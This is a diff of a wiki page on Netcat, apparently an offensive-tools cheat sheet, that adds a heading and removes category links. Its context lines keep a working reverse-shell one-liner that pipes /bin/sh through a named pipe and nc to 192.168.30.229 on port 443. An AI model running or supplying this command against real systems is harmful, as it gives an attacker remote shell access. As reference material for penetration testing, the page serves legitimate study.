@@ -3,6 +3,8 @@ title: Netcat
 permalink: /Netcat/
 ---
 
+# Netcat
+
 Bind shell
 ----------
 
@@ -52,4 +54,3 @@ mknod /tmp/backpipe p
 bin/sh 0</tmp/backpipe | nc 192.168.30.229 443 1>/tmp/backpipe
 ```
 
-[Category:Outils](/Category:Outils "wikilink") [Category:Exploitation](/Category:Exploitation "wikilink")
